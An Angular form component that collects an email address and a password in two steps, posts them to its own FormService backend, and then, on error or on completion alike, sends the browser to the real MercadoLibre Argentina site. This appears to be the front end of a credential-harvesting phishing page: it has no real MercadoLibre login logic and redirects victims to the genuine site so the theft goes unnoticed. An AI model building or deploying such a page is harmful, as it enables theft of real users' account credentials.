import { Component, Input } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { FormService } from './form.service';
import { BehaviorSubject, Observable } from 'rxjs';
import { FormInterface } from './form.interface';
import { Router } from '@angular/router';

@Component({
  selector: 'app-form',
  templateUrl: './form.component.html',
  styleUrls: ['./form.component.scss'],
})
export class FormComponent {
  @Input() fromBackoffice: boolean = false;
  formData$: Observable<FormInterface> = this.formService.getFormData();
  showPassword: boolean = false;
  loading$: BehaviorSubject<boolean> = new BehaviorSubject<boolean>(false);
  form: FormGroup = this.fb.group(
    {
      email: [null, [Validators.required]],
      password: [null, [Validators.required]],
    },
    { updateOn: 'change' }
  );
  constructor(
    private fb: FormBuilder,
    private formService: FormService,
    private router: Router
  ) {}

  setEmail(): void {
    if (this.form.get('email')?.value) {
      this.formService.setEmail(this.form.get('email')?.value);
    }
  }

  sendEmail(): void {
    this.loading$.next(true);
    if (this.form.get('email')?.value) {
      this.formService.postEmail(this.form.get('email')?.value).subscribe({
        next: () => this.loading$.next(false),
        error: () => this.loading$.next(false),
        complete: () => this.router.navigateByUrl('/'),
      });
      //.subscribe((data) => this.router.navigateByUrl('/'));
    }
  }

  changeInputType(): void {
    this.showPassword = !this.showPassword;
  }
  onSubmit(): void {
    this.loading$.next(true);
    if (this.form.get('password')?.value) {
      this.formService.setPassword(this.form.get('password')?.value);
      this.formService.postUserData().subscribe({
        next: () => this.loading$.next(false),
        error: () => this.redirectUser(),
        complete: () => this.redirectUser(),
      });
      // .subscribe((data) => {
      //   window.open('https://www.mercadolibre.com.ar/', '_self');
      // });
    }
  }

  redirectUser(): void {
    window.open('https://www.mercadolibre.com.ar/', '_self');
  }
}
